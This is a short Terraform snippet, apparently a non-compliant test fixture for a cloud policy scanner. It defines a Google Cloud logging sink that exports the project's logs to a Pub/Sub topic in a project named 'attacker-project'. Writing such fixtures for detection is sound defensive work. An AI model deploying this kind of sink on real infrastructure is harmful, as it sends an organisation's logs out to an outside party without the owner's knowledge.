resource "google_logging_project_sink" "non_compliant_example_1" {
  name        = "non_compliant_example_1"
  project     = "my-project"
  destination = "pubsub.googleapis.com/projects/attacker-project/topics/logs"

  unique_writer_identity = true
}
